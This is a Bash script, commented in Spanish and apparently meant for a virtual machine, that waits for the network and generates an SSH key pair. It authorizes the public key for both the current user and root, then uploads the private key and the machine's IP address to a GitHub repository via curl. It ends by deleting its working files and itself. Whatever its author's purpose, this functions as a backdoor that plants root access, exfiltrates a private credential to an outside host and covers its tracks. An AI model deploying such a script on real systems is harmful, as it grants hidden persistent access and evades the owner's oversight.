#!/bin/bash

# Reemplaza 'eth0' con el nombre de tu interfaz de red
INTERFACE="enp0s8"

# Esperar a que la red esté disponible
while ! ip link show $INTERFACE | grep -q "state UP"; do
	echo "Esperando a que la interfaz de red $INTERFACE esté activa..."
	sleep 5
done

# Alternativamente, puedes esperar a que haya conexión con un host específico
while ! ping -c 1 -W 1 8.8.8.8; do
	echo "Esperando conexión de red..."
	sleep 5
done

echo "Red activa. Ejecutando el resto del script."

#Usuario de GitHub
GHUSER="Aariazp"
GHREPO="SSH-VM"
GITHUB_TOKEN=""
# 1. Generar par de llaves SSH
ssh-keygen -t rsa -b 4096 -f ~/ssh_key -N "" <<<y >/dev/null 2>&1

# 2. Añadir la clave pública generada a authorized_keys
mkdir -p ~/.ssh
cat ~/ssh_key.pub >>~/.ssh/authorized_keys
cat ~/ssh_key.pub >>/root/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 3. Obtener la IP de la máquina
ip_address=$(hostname -I | awk '{print $1}')
echo "$ip_address" >~/ip_address.txt
# 4. Crear una carpeta cuyo nombre sea la dirección IP de la máquina
folder_name=~/ssh_info_$ip_address
mkdir -p "$folder_name"

# 5. Verificar si los archivos se han creado
if [ ! -f ~/ssh_key ] || [ ! -f ~/ssh_key.pub ] || [ ! -f ~/ip_address.txt ]; then
	echo "Error: Uno o más archivos necesarios no se encontraron."
	exit 1
fi

# 6. Mover las llaves SSH y el archivo de IP a la carpeta
mv ~/ssh_key ~/ssh_key.pub ~/ip_address.txt "$folder_name"

# 7. Subir cada archivo dentro de la carpeta al repositorio, manteniendo la estructura de carpetas
REPO="$GHUSER/$GHREPO"
BRANCH="main" # Cambia por la rama adecuada

# Función para subir un archivo a GitHub
upload_file() {
	local file_path=$1
	local repo_path=$2

	# Leer el contenido del archivo y convertirlo a base64
	file_content=$(base64 -w 0 "$file_path")

	# Obtener el SHA del archivo si ya existe en el repositorio
	file_sha=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
		-H "Accept: application/vnd.github.v3+json" \
		https://api.github.com/repos/$REPO/contents/$repo_path?ref=$BRANCH | jq -r '.sha')

	# Crear el JSON para subir/actualizar el archivo
	if [ "$file_sha" == "null" ]; then
		# Crear archivo si no existe
		curl -s -X PUT -H "Authorization: token $GITHUB_TOKEN" \
			-H "Accept: application/vnd.github.v3+json" \
			https://api.github.com/repos/$REPO/contents/$repo_path \
			-d "$(jq -n \
				--arg msg "Add $repo_path" \
				--arg content "$file_content" \
				--arg branch "$BRANCH" \
				'{"message":$msg,"content":$content,"branch":$branch}')"
	else
		# Actualizar archivo si ya existe
		curl -s -X PUT -H "Authorization: token $GITHUB_TOKEN" \
			-H "Accept: application/vnd.github.v3+json" \
			https://api.github.com/repos/$REPO/contents/$repo_path \
			-d "$(jq -n \
				--arg msg "Update $repo_path" \
				--arg content "$file_content" \
				--arg sha "$file_sha" \
				--arg branch "$BRANCH" \
				'{"message":$msg,"content":$content,"sha":$sha,"branch":$branch}')"
	fi
}

# Recorrer todos los archivos de la carpeta y subirlos uno por uno
for file in "$folder_name"/*; do
	if [ -f "$file" ]; then
		FILENAME=$(basename "$file")
		REPO_PATH="$ip_address/$FILENAME" # Ruta en el repositorio, dentro de la carpeta con nombre de la IP
		upload_file "$file" "$REPO_PATH"
	fi
done

rm -rf "$folder_name"
rm "$0"
